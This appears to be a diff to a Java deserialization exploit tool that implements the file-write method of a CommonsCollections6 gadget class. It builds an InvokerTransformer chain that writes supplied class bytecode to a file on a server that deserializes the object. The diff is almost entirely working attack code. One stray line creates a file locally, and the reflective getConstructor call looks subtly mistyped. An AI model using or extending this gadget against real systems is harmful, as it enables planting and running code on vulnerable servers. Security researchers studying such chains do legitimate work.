@@ -26,6 +26,8 @@ import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.functors.InvokerTransformer;
 import org.apache.commons.collections.keyvalue.TiedMapEntry;
 import org.apache.commons.collections.map.LazyMap;
+
+import java.io.FileOutputStream;
 import java.io.Serializable;
 import java.lang.reflect.Field;
 import java.net.URLClassLoader;
@@ -116,7 +118,16 @@ public class CommonsCollections6Gadget implements ObjectGadget<Serializable> {
      */
     @Override
     public Serializable getWriteFileObject(GadgetParam param) throws Exception {
-        return null;
+        byte[] codeByte = param.getCodeByte();
+        String className = param.getClassName()+".class";
+        FileOutputStream.class.getConstructor(String.class).newInstance(className);
+        final Transformer[] transformers = new Transformer[] {
+                new ConstantTransformer(Class.forName("java.io.FileOutputStream")),
+                new InvokerTransformer("getConstructor", new Class[]{Class.class}, new Object[]{String.class}),
+                new InvokerTransformer("newInstance", new Class[]{String.class}, new Object[]{className}),
+                new InvokerTransformer("write", new Class[]{byte[].class}, new Object[]{codeByte}),
+                new ConstantTransformer(1) };
+        return getObject(transformers);
     }
 
     /**
